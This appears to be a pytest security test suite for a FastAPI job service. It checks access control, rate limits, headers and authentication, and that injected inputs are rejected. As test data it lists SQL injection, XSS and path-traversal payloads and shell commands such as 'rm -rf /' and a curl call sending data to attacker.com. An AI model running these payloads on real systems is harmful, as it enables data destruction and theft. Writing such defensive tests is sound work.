import pytest
from fastapi import status
from core.security import SecurityValidator
from models import Job, JobStatus
from datetime import datetime, timedelta
from core.security import RedisRateLimiter, get_rate_limiter_dep
@pytest.mark.security
class TestBrokenAccessControl:
    def test_user_cannot_access_other_users_jobs(self, client, test_db):
        job1 = Job(
            job_type="train_sklearn_model",
            config={"n_estimators": 100, "dataset_rows": 1000},
            user_id="user1",
            status=JobStatus.PENDING,
            priority=5
        )

        job2 = Job(
            job_type="train_sklearn_model",
            config={"n_estimators": 100, "dataset_rows": 1000},
            user_id="user2",
            status=JobStatus.PENDING,
            priority=5
        )

        test_db.add_all([job1, job2])
        test_db.commit()

        headers = {"Authorization": "Bearer test_api_key_user1"}
        response = client.get(f"/jobs{job2.id}", headers=headers)

        assert response.status_code in [status.HTTP_403_FORBIDDEN, status.HTTP_404_NOT_FOUND]

    def test_unauthorized_job_cancellation(self, client, test_db):
        job = Job(
            job_type="train_sklearn_model",
            config={"n_estimators": 100, "dataset_rows": 1000},
            user_id="victim_user",
            status=JobStatus.RUNNING,
            priority=5
        )

        test_db.add(job)
        test_db.commit()

        attacker_headers = {"Authorization": "Bearer test_api_key_attacker"}
        response = client.post(f"/jobs/{job.id}/cancel", headers=attacker_headers)

        assert response.status_code in [status.HTTP_403_FORBIDDEN, status.HTTP_404_NOT_FOUND]

    def test_no_horizontal_privilege_escalation(self, client, test_db, auth_headers):
        user_job = Job(
            job_type="train_sklearn_model",
            config={"n_estimators": 100, "dataset_rows": 1000},
            user_id="user123",
            status=JobStatus.PENDING,
            priority=5
        )

        test_db.add(user_job)
        test_db.commit()

        reponse = client.get(f"/jobs/{user_job.id + 1000}", headers=auth_headers)

        assert reponse.status_code == status.HTTP_404_NOT_FOUND

@pytest.mark.security
class TestCryptographicFailures:
    def test_api_keys_not_exposed_in_responses(self, client, auth_headers):
        response = client.get("/health", headers = auth_headers)

        response_text = response.text.lower()
        assert "api_key" not in response_text
        assert "bearer" not in response_text

    def test_sensitive_data_not_logged(self, client, auth_headers, caplog):
        client.post(
            "/jobs",
            json = {
                "job_type": "train_sklearn_model",
                "config": {
                    "n_estimators": 100,
                    "dataset_rows": 10000
                },
                "priority": 5
            },
            headers = auth_headers
        )

        log_text = caplog.text.lower()
        assert "api_key" not in log_text

@pytest.mark.security
class TestInjectionPrevention:
    @pytest.fixture
    def validator(self):
        return SecurityValidator()
    
    @pytest.mark.parametrize("sql_injection", [
        "'; DROP TABLE jobs; --",
        "1' OR '1'='1",
        "admin'--",
        "1; DELETE FROM jobs WHERE 1=1; --",
        "'; UPDATE jobs SET status='completed' WHERE '1'='1",
        "1' UNION SELECT * FROM users--",
        "' OR 1=1--",
        "admin' OR '1'='1' /*",
    ])

    def test_sql_injection_blocked(self, validator, sql_injection):
        is_valid, error = validator.validate_job(
            "train_sklearn_model",
            {"malicious_field": sql_injection}
        )

        assert is_valid is False
        assert "dangerous" in error.lower() or "pattern" in error.lower()

    @pytest.mark.parametrize("command_injection", [
        "__import__('os').system('rm -rf /')",
        "exec('import os; os.system(\"cat /etc/passwd\")')",
        "eval('__import__(\"os\").system(\"ls\")')",
        "compile('malicious_code', '<string>', 'exec')",
        "subprocess.call(['rm', '-rf', '/'])",
        "os.system('curl attacker.com/steal?data=')",
    ])
    def test_command_injection_blocked(self, validator, command_injection):
        is_valid, error = validator.validate_job(
            "train_sklearn_model",
            {"code": command_injection}
        )

        assert is_valid is False

    @pytest.mark.parametrize("path_traversal", [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "/etc/shadow",
        "../../.env",
        "../secrets.yaml",
    ])
    def test_path_traversal_blocked(self, validator, path_traversal):
        is_valid, error = validator.validate_job(
            "train_sklearn_model",
            {"field_path": path_traversal}
        )

        assert is_valid is False

    @pytest.mark.parametrize("template_injection", [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert(document.cookie)",
        "<svg/onload=alert('XSS')>",
        "';alert(String.fromCharCode(88,83,83))//",
        "<iframe src='javascript:alert(1)'>",
    ])
    def test_xss_blocked(self, validator, template_injection):
        is_valid, error = validator.validate_job(
            "train_sklearn_model",
            {"template": template_injection}
        )

        assert is_valid is False

    def test_nosql_injection_blocked(self, validator):
        is_valid, error = validator.validate_job(
            "train_sklearn_model",
            {"filter": {"$ne": None}}
        )

        assert isinstance(is_valid, bool)

@pytest.mark.security
class TestInsecureDesign:
    def test_rate_limiting_prevents_abuse(self, client, auth_headers, mock_redis, test_app):
        pipeline = mock_redis.pipeline.return_value
        pipeline.execute.return_value = [0, 100, True, True]

        def override_rate_limiter():
            return RedisRateLimiter(redis_client = mock_redis)
        
        test_app.dependency_overrides[get_rate_limiter_dep] = override_rate_limiter

        response = client.post(
            "/jobs",
            json = {
                "job_type": "train_sklearn_model",
                "config": {
                    "n_estimators": 10000
                },
                "priority": 5
            },
            headers = auth_headers
        )

        test_app.dependency_overrides.clear()

        assert response.status_code == status.HTTP_429_TOO_MANY_REQUESTS

    def test_resource_limits_prevent_dos(self, client, auth_headers):
        response = client.post(
            "/jobs",
            json = {
                "job_type": "train_sklearn_model",
                "config": {
                    "n_estimators": 10_000_000,
                    "dataset_rows": 100_000_000
                },
                "priority": 5
            },
            headers = auth_headers
        )

        assert response.status_code == status.HTTP_400_BAD_REQUEST

    def test_bulk_operations_limit(self, client, auth_headers):
        jobs = [
            {
                "job_type": "train_sklearn_model",
                "config": {
                    "n_estimators": 100,
                },
                "priority": 5
            }
        ] * 101

        response = client.post(
            "/api/v1/bulk/jobs",
            json = {
                "jobs": jobs
            },
            headers = auth_headers
        )

        assert response.status_code == status.HTTP_400_BAD_REQUEST

@pytest.mark.security
class TestSecurityMisconfiguration:
    def test_security_headers_present(self, client):
        response = client.get("/health")

        assert "X-Frame-Options" in response.headers
        assert response.headers["X-Frame-Options"] == "DENY"
        assert "X-Content-Type-Options" in response.headers
        assert response.headers["X-Content-Type-Options"] == "nosniff"
        assert "Strict-Transport-Security" in response.headers

    def test_cors_properly_configured(self, client):
        response = client.options("/jobs", headers={"Origin": "https://example.com"})

        if "Access-Control-Allow-Origin" in response.headers:
            assert response.headers["Access-Control-Allow-Origin"] != "*"

    def test_error_messages_not_verbose(self, client):
        response = client.get("/jobs/99999", headers = {"Authorization": "Bearer invalid_key"})

        error_text = response.text.lower()
        assert "traceback" not in error_text
        assert "/backend/" not in error_text
        assert "sqlalchemy" not in error_text

@pytest.mark.security
class TestAuthenticationFailures:
    def test_requires_authentication(self, client):
        response = client.post(
            "/jobs",
            json = {
                "job_type": "train_sklearn_model",
                "config": {
                    "n_estimators": 100
                },
                "priority": 5
            }
        )

        assert response.status_code in [status.HTTP_403_FORBIDDEN, status.HTTP_401_UNAUTHORIZED]

    def test_rejects_invalid_api_keys(self, client):
        response = client.get(
            "/jobs",
            headers = {"Authorization": "Bearer invalid_api_key"}
        )

        assert response.status_code == status.HTTP_401_UNAUTHORIZED

    def test_rejcts_malformed_auth_headers(self, client):
        malformed_headers = [
            {"Authorization": "invalid_format"},
            {"Authorization": "Bearer"},
            {"Authorization": ""},
            {"Authorization": "Basic dGVzdDp0ZXN0"},
        ]

        for header in malformed_headers:
            response = client.get("/jobs", headers = header)
            assert response.status_code in [status.HTTP_403_FORBIDDEN, status.HTTP_401_UNAUTHORIZED]

@pytest.mark.security
class TestSoftwareIntegrity:
    def test_job_config_integrity(self, client, auth_headers, test_db):
        response = client.post(
            "/jobs",
            json = {
                "job_type": "train_sklearn_model",
                "config": {
                    "model": "RandomForest",
                    "n_estimators": 100,
                    "dataset_rows": 10000
                },
                "priority": 5
            },
            headers = auth_headers
        )

        job_id = response.json()["id"]

        job = test_db.query(Job).filter(Job.id == job_id).first()
        assert job.config["n_estimators"] == 100

    def test_status_transition_validation(self, test_db):
        job = Job(
            job_type="train_sklearn_model",
            config={"n_estimators": 100, "dataset_rows": 1000},
            user_id="user123",
            status=JobStatus.COMPLETED,
            priority=5
        )

        test_db.add(job)
        test_db.commit()

        assert job.status == JobStatus.COMPLETED

@pytest.mark.security
class TestSecurityLogging:
    def test_failed_auth_logged(self, client, caplog):
        client.get(
            "/jobs",
            headers = {"Authorization": "Bearer invalid_api_key"}
        )

        assert len(caplog.records) > 0

    def test_job_creation_logged(self, client, auth_headers, caplog):
        client.post(
            "/jobs",
            json = {
                "job_type": "train_sklearn_model",
                "config": {
                    "n_estimators": 100
                },
                "priority": 5
            },
            headers = auth_headers
        )

        assert len(caplog.records) > 0

@pytest.mark.security
class TestSSRFPrevention:
    def test_no_external_url_in_config(self, client, auth_headers):
        response = client.post(
            "/jobs",
            json = {
                "job_type": "train_sklearn_model",
                "config": {
                    "n_estimators": 100,
                    "data_source": "http://internal-server/admin"
                },
                "priority": 5
            },
            headers = auth_headers
        )

        assert response.status_code == status.HTTP_400_BAD_REQUEST